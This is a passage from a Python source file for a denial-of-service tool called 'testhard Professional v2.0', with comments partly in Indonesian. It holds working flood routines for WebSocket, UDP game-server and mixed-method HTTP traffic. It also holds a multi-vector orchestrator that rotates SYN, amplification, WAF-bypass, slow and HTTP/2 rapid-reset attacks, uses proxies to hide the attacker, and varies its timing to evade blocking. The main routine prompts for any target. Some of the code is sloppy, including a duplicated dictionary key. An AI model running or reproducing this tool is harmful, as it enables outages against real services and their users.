                                self.report_dead_proxy(proxy_dict['http'].replace("http://", ""))
                            self.global_learning_data["errors"]["slow_websocket_flood"] += 1
                        if self.dynamic_mode: break
                except:
                    await asyncio.sleep(1)

        asyncio.run(_attack())

    def websocket_flood(self):
        """WebSocket Flood (Async) - Membuka banyak koneksi WS dan mengirim data sampah"""
        if not AIOHTTP_AVAILABLE:
            return

        async def _attack():
            while self.running:
                try:
                    proxy_dict = self.get_proxy()
                    proxy_url = proxy_dict['http'] if proxy_dict else None
                    
                    port = self.get_target_port("l7")
                    scheme = "wss" if port == 443 else "ws"
                    url = f"{scheme}://{self.target}:{port}{self.get_smart_path()}"
                    
                    headers = {'User-Agent': self.get_user_agent()}
                    
                    connector = aiohttp.TCPConnector(ssl=False, limit=0)
                    async with aiohttp.ClientSession(connector=connector) as session:
                        try:
                            async with session.ws_connect(url, headers=headers, proxy=proxy_url, timeout=10) as ws:
                                self.stats["connections"] += 1
                                while self.running:
                                    payload = self.generate_payload(16, 256).decode(errors='ignore')
                                    await ws.send_str(payload)
                                    self.stats["requests"] += 1
                                    await asyncio.sleep(random.uniform(0.05, 0.2))
                        except Exception:
                            if proxy_dict:
                                self.report_dead_proxy(proxy_dict['http'].replace("http://", ""))
                            self.global_learning_data["errors"]["websocket_flood"] += 1
                        if self.dynamic_mode: break
                except:
                    await asyncio.sleep(1)

        asyncio.run(_attack())

    def vse_flood(self):
        """Valve Source Engine Query Flood (UDP)"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        except: return
        
        payload = b'\xff\xff\xff\xffTSource Engine Query\x00'
        while self.running:
            try:
                self.new_dangerous_function()
                target_ip = self.get_target_ip()
                port = self.get_target_port("l4")
                s.sendto(payload, (target_ip, port))
                self.stats["packets"] += 1
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["vse_flood"] += 1

    def teamspeak_flood(self):
        """TeamSpeak 3 UDP Flood"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        except: return
        
        # TS3 Init packet
        payload = b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02'
        while self.running:
            try:
                self.new_dangerous_function()
                target_ip = self.get_target_ip()
                port = self.get_target_port("l4")
                s.sendto(payload, (target_ip, port))
                self.stats["packets"] += 1
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["teamspeak_flood"] += 1

    def http_mixed_flood(self):
        """HTTP Mixed Method Flood (GET/POST/HEAD/PUT/DELETE)"""
        with requests.Session() as s:
            while self.running:
                try:
                    self.new_dangerous_function()
                    proxy = self.get_proxy()
                    current_port = self.get_target_port("l7")
                    scheme = "https" if current_port == 443 else "http"
                    url = f"{scheme}://{self.target}:{current_port}{self.get_smart_path()}"
                    
                    headers = {
                        'User-Agent': self.get_user_agent(),
                        'X-Forwarded-For': self.generate_smart_ip(),
                        'Connection': 'keep-alive'
                    }
                    
                    method = random.choice(["GET", "POST", "HEAD", "PUT", "DELETE"])
                    if method in ["POST", "PUT"]:
                        data = self.generate_payload(10, 100)
                        s.request(method, url, headers=headers, data=data, proxies=proxy, timeout=3, verify=False)
                    else:
                        s.request(method, url, headers=headers, proxies=proxy, timeout=3, verify=False)
                        
                    self.stats["requests"] += 1
                    if self.dynamic_mode: break
                except:
                    self.global_learning_data["errors"]["http_mixed_flood"] += 1

    def multi_vector_worker(self):
        """Worker thread for multi-vector attack. Continuously picks and runs attacks based on AI weights."""
        while self.running:
            try:
                # Select attack category based on current weights
                categories = list(self.attack_weights.keys())
                weights = list(self.attack_weights.values())
                
                if not categories or sum(weights) == 0:
                    time.sleep(0.1)
                    continue

                selected_category = random.choices(categories, weights=weights, k=1)[0]
                
                # Select a specific attack function from the chosen category
                attack_functions = self.attack_vectors.get(selected_category, [])
                if attack_functions:
                    attack_func = random.choice(attack_functions)
                    attack_func()
                    
                    # Jika DEFCON 1, paksa semua worker masuk mode nuklir
                    if self.ai.defcon == PIYOAIAnalyzer.Defcon.NUCLEAR:
                        self.nuclear_strike()
                        continue
                    
                    # Chaotic Pacing: Use Logistic Map Chaos
                    # This prevents pattern-based blocking
                    jitter = self.ai.get_chaotic_delay(self.aggression_level)
                    time.sleep(jitter)
                else:
                    time.sleep(0.01) # Small sleep if category is empty
            except Exception:
                # Silently continue to the next attack
                pass

    def multi_vector_test(self):
        """Multi-vector: Orkestrasi serangan cerdas dengan bobot AI & rotasi dinamis"""
        # 1. Setup Attack Vectors
        self.attack_vectors = {
            "l4": [self.syn_flood_raw, self.tcp_manipulation_flood, self.udp_flood, self.udp_fragmentation_flood, self.quic_initial_flood, self.big_packet_flood, self.ovh_bypass_flood, self.connection_flood, self.vse_flood, self.teamspeak_flood, self.dns_query_flood],
            "l4": [self.syn_flood_raw, self.tcp_manipulation_flood, self.udp_flood, self.udp_fragmentation_flood, self.quic_initial_flood, self.big_packet_flood, self.ovh_bypass_flood, self.connection_flood, self.vse_flood, self.teamspeak_flood, self.dns_query_flood, self.icmp_flood],
            "l7": [self.http_get_flood, self.http_post_flood, self.http_head_flood, self.http_cookie_flood, self.range_flood, self.fragmented_flood, self.pipeline_flood, self.layer8_browser_flow, self.xmlrpc_flood, self.zero_day_flood, self.http_mixed_flood, self.websocket_flood],
            "bypass": [self.cloudflare_flood, self.ssl_exhaustion_flood, self.rudy_flood, self.bypass_waf_flood, self.advanced_bypass_flood, self.smuggler_flood],
            "amp": [], # Amplification attacks
            "cffi": [],
            "proxy": [self.tcp_proxy_flood, self.udp_flood_socks5],
            "quantum": [self.quantum_recursive_flood, self.recursive_flood, self.random_subdomain_flood, self.api_json_flood, self.minecraft_pe_flood, self.dns_water_torture, self.graphql_flood],
            "slow": [self.slowloris_flood, self.slow_read_flood, self.sockstress_flood, self.slow_websocket_flood],
            "nuclear": [self.nuclear_strike] # Special vector
        }
        
        if SCAPY_AVAILABLE:
            self.attack_vectors["l4"].extend([
                self.syn_flood, self.icmp_flood, self.tcp_fin_flood, self.tcp_rst_flood,
                self.syn_flood, self.tcp_fin_flood, self.tcp_rst_flood,
                self.tcp_ack_flood, self.tcp_xmas_flood, self.udp_random_flood, self.tcp_null_flood, self.tcp_window_size_flood
            ])
            self.attack_vectors["amp"].extend([self.dns_amplification, self.ntp_amplification, self.memcached_amplification, self.ssdp_amplification, self.snmp_amplification, self.tftp_amplification])
        
        if CURL_CFFI_AVAILABLE:
            self.attack_vectors["cffi"].extend([self.cffi_bypass_flood, self.http2_multiplex_flood, self.http2_rapid_reset])
        self.dynamic_mode = True # Aktifkan mode dinamis untuk multi-vector
            
        # 2. Analisis target untuk mendapatkan bobot serangan
        initial_weights = self.analyze_target()

        # CLUSTER BOMB MODE: Override weights to MAXIMUM
        if hasattr(self, 'cluster_mode') and self.cluster_mode:
            print(f"{Fore.RED}[☢️] CLUSTER BOMB ACTIVATED: MAXIMIZING ALL ATTACK VECTORS!{Fore.RESET}")
            # Force enable all vectors regardless of AI analysis
            initial_weights = {"l4": 100, "l7": 100, "bypass": 100, "amp": 100, "cffi": 100, "quantum": 100}
            self.aggression_level = 5.0 # Max aggression start
        
        # Map initial analysis to our vector categories
        self.attack_weights = {
            "l4": initial_weights.get("l4", 1),
            "l7": initial_weights.get("l7", 1),
            "bypass": initial_weights.get("bypass", 1),
            "amp": initial_weights.get("amp", 0),
            "cffi": initial_weights.get("cffi", 0),
            "proxy": initial_weights.get("proxy_l4", 0),
            "quantum": initial_weights.get("quantum", 1) # Quantum is a type of L7, default to 1
        }

        # Clean up empty vectors and their weights
        keys_to_remove = [k for k, v in self.attack_vectors.items() if not v]
        for k in keys_to_remove:
            del self.attack_vectors[k]
            if k in self.attack_weights: del self.attack_weights[k]

        # Normalize initial weights to sum to 1
        total_initial_weight_sum = sum(self.attack_weights.values())
        if total_initial_weight_sum > 0:
            self.attack_weights = {k: v / total_initial_weight_sum for k, v in self.attack_weights.items()}
        
        if not SCAPY_AVAILABLE:
            print(f"{Fore.YELLOW}[!] Scapy tidak ditemukan. Serangan L4 tingkat lanjut dinonaktifkan.")
        
        print(f"{Fore.CYAN}[+] AI Configured Attack Vectors: {list(self.attack_weights.keys())}")
        
        # Jalankan worker threads
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.multi_vector_worker, daemon=True)
            t.start()
            threads.append(t)
        
        # Start AI Orchestrator
        threading.Thread(target=self.AI_Orchestrator, daemon=True).start()
        
        # Keep the main thread alive while workers are running
        while self.running:
            time.sleep(1)

    def start(self, mode="multi"):
        print(f"{Fore.RED}[+] DDoS v2.0 START pada {self.target}:{self.port}")
        print(f"{Fore.CYAN}[+] Threads: {self.threads} | Proxies: {len(self.proxies)}")
        
        l7_modes = ["http-get", "http-post", "http-head", "slowloris", "slow_read", "cookie", "cloudflare", "multi"]
        if mode in l7_modes and not self.proxies:
            print(f"\n{Fore.RED}{Style.BRIGHT}[!] BAHAYA: Tidak ada proxy yang dimuat!{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}    Serangan HTTP (Layer 7) akan menggunakan IP ASLI Anda.")
            print(f"{Fore.YELLOW}    Target dapat dengan mudah memblokir IP Anda.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}    Tekan Ctrl+C untuk batal, atau tunggu 5 detik untuk lanjut (Risiko Sendiri)...{Style.RESET_ALL}\n")
            time.sleep(5)
        
        stat_thread = threading.Thread(target=self.stats_printer, daemon=True)
        stat_thread.start()
        
        # Start AI Monitor
        ai_thread = threading.Thread(target=self.ai_monitor, daemon=True)
        ai_thread.start()

        if mode == "multi":
            self.multi_vector_test()
        else:
            try:
                method = getattr(self, mode + "_flood")
            except AttributeError:
                try:
                    method = getattr(self, mode + "_amplification")
                except AttributeError:
                    print(f"{Fore.RED}[!] Mode '{mode}' tidak ditemukan. Menggunakan multi.")
                    self.multi_vector_test()
                    return

            threads = []
            for _ in range(self.threads):
                t = threading.Thread(target=method, daemon=True)
                t.start()
                threads.append(t)
            
            try:
                while True: time.sleep(1)
            except KeyboardInterrupt:
                self.running = False
                print(f"\n{Fore.YELLOW}[+] Attack STOPPED | Final Stats: {self.stats}")

if __name__ == "__main__":
    # Cek Admin/Root untuk Raw Socket
    try:
        is_admin = os.getuid() == 0
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    
    if not is_admin:
        print(f"{Fore.YELLOW}[WARNING] Script tidak berjalan sebagai Admin/Root. Metode L4 (SYN/UDP) mungkin gagal.{Style.RESET_ALL}")

    print(f"{Fore.MAGENTA}=== testhard Professional v2.0 ===\n")
    target = input("Target IP/Domain: ")
    port_input = input("Port (Contoh: 22,53,80,443 atau 0 untuk random): ") or "80"
    
    try:
        if "," in port_input:
            port = [int(p.strip()) for p in port_input.split(",")]
        else:
            port = int(port_input)
    except ValueError:
        port = 80
        
    threads = int(input("Threads (default 1000): ") or 1000)
    mode = input("Mode (syn/udp/udp_socks5/http-post/http-get/http-head/dns/icmp/slowloris/slow_read/fin/rst/ack/xmas/udp_random/ssl_exhaustion/rudy/udp_fragmentation/ntp/null/cookie/cloudflare/bypass_waf/advanced_bypass/memcached/recursive/quantum_recursive/http2_multiplex/http2_rapid_reset/smuggler/fragmented/pipeline/layer8_browser/tcp_window/quic/xmlrpc/big_packet/zero_day/ovh_bypass/minecraft_pe/connection/vse/teamspeak/syn_ack/ssdp/snmp/tftp/dns_query/websocket/http_mixed/cluster/multi): ").lower() or "multi"
    
    test = testhard(target, port, threads)
    if mode == "cluster":
        test.cluster_mode = True
        test.start("multi")
    else:
        test.start(mode)